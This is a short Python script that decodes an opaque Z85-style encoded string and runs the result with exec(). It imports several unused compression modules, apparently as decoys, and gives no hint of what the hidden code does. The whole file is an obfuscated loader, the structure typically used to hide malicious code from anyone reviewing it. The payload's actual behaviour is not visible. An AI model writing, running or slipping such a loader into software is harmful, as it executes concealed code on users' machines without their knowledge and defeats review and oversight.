import base64, codecs, zlib, lzma, gzip, bz2, marshal
_p = b'v@bN{B0ay)B8#5lzAnaEarR!qwO95(uUKy(Byex6B7Gf1efFRAB95@QAbP=sjV1#Kdlm!UarR^HarR!FwO+%hxM4%lauZ&Xz/Z1carR^HarR^HB7Gf1e]U-HBrAZ?AbP=s3jm)#arUiaw/#kpy::voy?taS3lQDlarR^HaAz4nB-Ivxw*.nlBz#pZfe4V[wO+%hxM4%lEl8Z@wO+%hAbP=sEj(@P3s)ZWvrDydauZ&CwPI{bz/c%JwQ4T2Abo8rv@Diidgc4P'
_A = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#'
_o = bytearray()
for _i in range(0, len(_p), 5):
    _v = 0
    for _c in _p[_i:_i + 5]:
        _v = _v * 85 + _A.index(chr(_c))
    _o.extend(_v.to_bytes(4, 'big'))
exec(bytes(_o).rstrip(b'\x00').decode())
